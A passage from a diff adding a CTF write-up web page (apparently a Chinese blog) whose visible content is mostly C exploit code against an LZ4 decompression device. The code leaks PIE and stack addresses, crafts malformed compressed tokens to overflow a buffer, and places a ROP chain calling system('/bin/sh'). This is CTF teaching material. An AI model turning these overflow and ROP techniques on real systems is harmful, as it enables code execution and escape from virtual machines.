+    printf(&quot;higher pie %llx \n&quot;,higherpie);
+    uint64_t pie=lowerpie|(higherpie&lt;&lt;32);
+    pie=pie-0x44a879;
+    printf(&quot;pie %llx \n&quot;,pie);
+
+    uint64_t system_addr=0x0000000000822D77+pie;
+    uint64_t binsh_addr=0x0000000000A7D49E +pie;
+    uint64_t pop_rdi_ret=0x0000000000335838+pie;
+    uint64_t ret_addr=0x0000000000335839+pie;
+
+
+    uint64_t lowerstack =*(uint32_t*)(inbuf);  //0xc01f20  0x7cee0a000000
+    printf(&quot;lower stack %llx \n&quot;,lowerstack);
+    uint64_t higherstack =*(uint32_t*)(inbuf+4);
+    printf(&quot;higher stack %llx \n&quot;,higherstack);
+    uint64_t stack=lowerstack|(higherstack&lt;&lt;32);
+
+    printf(&quot;stack %llx \n&quot;,stack);
+
+
+    *len_reg=0x100;
+   //paddding  4096
+    token=0x1f;
+    literal=1&lt;&lt;8;
+    offset=1&lt;&lt;16;
+
+    compress=token|literal|offset;
+    // Write some data to the input buffer
+    *(uint32_t*)inbuf=compress;
+      match_len=0xffffffffffffffff;
+    *(uint64_t*)(inbuf+4)=match_len;
+      match_len=0xfbffffffffffffff;
+    *(uint64_t*)(inbuf+12)=match_len;
+
+    
+
+
+    //paddding 0x48
+    token=0x1f;
+    literal=1&lt;&lt;8;
+    offset=1&lt;&lt;16;
+    compress=token|literal|offset;
+    *(uint32_t*)(inbuf+20)=compress;
+    match_len=0x47-0xf-4-0x20;
+    *(uint8_t*)(inbuf+24)=match_len;
+    
+
+    //rop chain
+    token=0xf0;
+    literal_len=(0x20-0xf)&lt;&lt;8;
+    compress=token|literal_len;
+    *(uint16_t*)(inbuf+25)=compress;
+    
+    printf(&quot;pop_rdi_ret %llx \n&quot;,pop_rdi_ret);
+    printf(&quot;binsh_addr %llx \n&quot;,binsh_addr);
+    printf(&quot;system_addr %llx \n&quot;,system_addr);
+    printf(&quot;ret_addr %llx \n&quot;,ret_addr);
+
+    *(uint64_t*)(inbuf+27)=pop_rdi_ret;
+    *(uint64_t*)(inbuf+35)=binsh_addr;
+    *(uint64_t*)(inbuf+43)=system_addr;
+    *(uint64_t*)(inbuf+51)= ret_addr;
+
+    offset=0;
+    *(uint16_t*)(inbuf+59)=offset;
+    
+    // padding 
+    token=0x1f;
+    literal=1&lt;&lt;8;
+    offset=1&lt;&lt;16;
+
+    compress=token|literal|offset;
+    // Write some data to the input buffer
+    *(uint32_t*)(inbuf+61)=compress;
+      match_len=0xffffffffffffffff;
+    *(uint64_t*)(inbuf+65)=match_len;
+      match_len=0xffffffffffffffff;
+    *(uint64_t*)(inbuf+73)=match_len;
+      match_len=0x95ffffffffff;
+    *(uint64_t*)(inbuf+81)=match_len;
+  
+
+   // cover TLS
+    token=0xf0;
+    literal_len=(0x28-0xf)&lt;&lt;8;
+    compress=token|literal_len;
+    *(uint16_t*)(inbuf+87)=compress;
+  
+
+    *(uint64_t*)(inbuf+89)=stack;
+    *(uint64_t*)(inbuf+97)=binsh_addr;
+    *(uint64_t*)(inbuf+105)=stack;
+    *(uint64_t*)(inbuf+113)= 1;
+    *(uint64_t*)(inbuf+121)= 0;
+    *(uint64_t*)(inbuf+129)= 0x101011001010101;
+    offset=0;
+    *(uint16_t*)(inbuf+137)=offset;
+
+    // trigger
+    int decompressed_len=*len_reg;
+    *trigger_reg = 1;
+    // Read the decompressed data from the input buffer
+    for (uint64_t i = 0; i &lt; decompressed_len; i++) {
+        printf(&quot;%02x \n&quot;, inbuf[i]);
+    }
+
+
+    // Unmap the device memory
+    munmap(map_base, VIRT_LZ4DEV_SIZE);
+
+    // Close the file descriptor
+    close(fd);
+
+    return 0;
+}
+//0x10f4d0
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E4%BA%AC%E9%BA%9F%20CTF%20-%20MazeCodeV1/"><span class="l">上一篇</span>2024 京麟 CTF - MazeCodeV1</a><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20CISCN/"><span class="l">下一篇</span>2024 CISCN</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d3" href="#1-解压-rootfscpiozst">1. 解压 rootfs.cpio.zst</a><a class="d3" href="#2-解包-cpio-文件">2. 解包 cpio 文件</a><a class="d3" href="#3-添加文件">3. 添加文件</a><a class="d3" href="#4-重新打包为-cpio-文件">4. 重新打包为 cpio 文件</a><a class="d3" href="#5-压缩为-zst-文件">5. 压缩为 .zst 文件</a><a class="d3" href="#清理临时文件">清理临时文件</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
